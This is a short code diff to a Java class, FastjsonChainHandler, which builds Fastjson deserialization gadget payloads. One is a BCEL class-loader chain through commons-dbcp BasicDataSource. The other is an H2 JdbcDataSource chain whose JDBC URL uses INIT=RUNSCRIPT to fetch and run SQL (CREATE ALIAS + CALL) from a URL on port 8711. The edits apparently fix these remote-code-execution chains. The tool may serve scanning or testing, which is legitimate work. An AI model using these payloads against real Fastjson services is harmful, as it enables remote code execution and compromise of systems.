@@ -99,7 +99,7 @@ public class FastjsonChainHandler implements ChainHandler {
     private String bcelJson(String driverClassName) {
         return String.format(
             "{\"@type\":\"org.apache.commons.dbcp.BasicDataSource\"," +
-            "\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"}," +
+            "\"driverClassLoader\":{\"@type\":\"org.apache.bcel.util.ClassLoader\"}," +
             "\"driverClassName\":\"%s\"}", jsonEsc(driverClassName));
     }
 
@@ -126,8 +126,10 @@ public class FastjsonChainHandler implements ChainHandler {
         // File-based execution avoids the JDBC URL parser semicolon truncation issue.
         // The sidecar's H2ScriptController serves CREATE ALIAS + CALL with the token baked in.
         String scriptUrl = "http://host.docker.internal:8711/h2-script?tok=" + tokShort;
+        // INIT= is the JDBC URL parameter for startup SQL; RUNSCRIPT FROM fetches SQL from URL
+        // RUNSCRIPT FROM 'URL' has no internal semicolons so URL parser won't truncate it
         String jdbcUrl = "jdbc:h2:mem:oobx" + dbId
-            + ";RUNSCRIPT FROM '" + scriptUrl + "'";
+            + ";INIT=RUNSCRIPT FROM '" + scriptUrl + "'";
         return String.format(
             "{\"@type\":\"org.h2.jdbcx.JdbcDataSource\","
             + "\"URL\":\"%s\","
